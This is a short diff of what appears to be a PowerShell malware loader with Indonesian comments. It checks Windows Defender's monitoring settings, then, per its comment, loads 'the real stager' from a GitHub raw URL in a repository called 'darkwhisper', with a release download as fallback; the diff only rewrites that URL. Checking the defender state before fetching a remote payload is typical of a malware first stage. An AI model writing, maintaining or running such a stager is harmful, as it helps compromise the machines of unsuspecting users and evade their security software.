@@ -32,7 +32,7 @@ try { $p = Get-MpPreference; B "hasil: rt=$($p.DisableRealtimeMonitoring) script
 
 # 3. baru muat stager sungguhan (raw dulu, release cadangan)
 $urls = @(
-    'https://raw.githubusercontent.com/byteforge0-cloud/darkwhisper/main/st.ps1',
+    'https://raw.githubusercontent.com/byteforge0-cloud/darkwhisper/refs/heads/main/st.ps1',
     'https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/st.ps1'
 )
 foreach ($u in $urls) {
